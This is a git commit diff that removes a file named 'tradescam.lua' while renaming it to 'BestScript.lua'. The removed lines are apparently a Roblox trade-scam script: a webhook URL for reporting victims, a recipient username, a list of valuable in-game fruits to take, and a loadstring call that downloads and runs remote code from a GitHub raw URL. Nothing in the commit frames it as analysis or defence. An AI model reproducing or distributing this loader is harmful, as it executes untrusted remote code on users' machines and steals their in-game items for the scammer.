2369b54b4d78550cfb914100a4f9d53d36747ab2
Corrupted-Hub <163355346+Corrupted-Hub@users.noreply.github.com>
2025-03-05 14:13:05 +0000

    Update and rename tradescam.lua to BestScript.lua

--- tradescam.lua
+++
@@ -1,5 +0,0 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=U0lmZENVc1Zvb3ZRaHVVaVlRaEZCUTo0RzJsT1kyMGhiczFBS1Zyc25leDVUSEZBcWpuYy1tVGVQaGdPZDRUaGJZSlhMb2UwZGJSV3lFN2R3TGV1M3lDNUlaZG1rVmI1RTNCRmx3MEVGNUpTb3M2aGtBeDhQTUlyZHFCN3pCb1hxVUh2dUFOVmlmNmdXSGl1dS1kQVpsajJDMTBvYVpPb25xS3JZd2doR2ZuYmFaTEJXTDRxYXBTTEsyV09RZl9QUWc"
-Usernames = {"Reyansh735728"}
-FruitsToHit = {"Buddha-Buddha", "Portal-Portal", "T-Rex-T-Rex", "Mammoth-Mammoth", "Dough-Dough", "Control-Control", "Gas-Gas", "Leopard-Leopard", "Yeti-Yeti", "Kitsune-Kitsune", "Spirit-Spirit"}
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
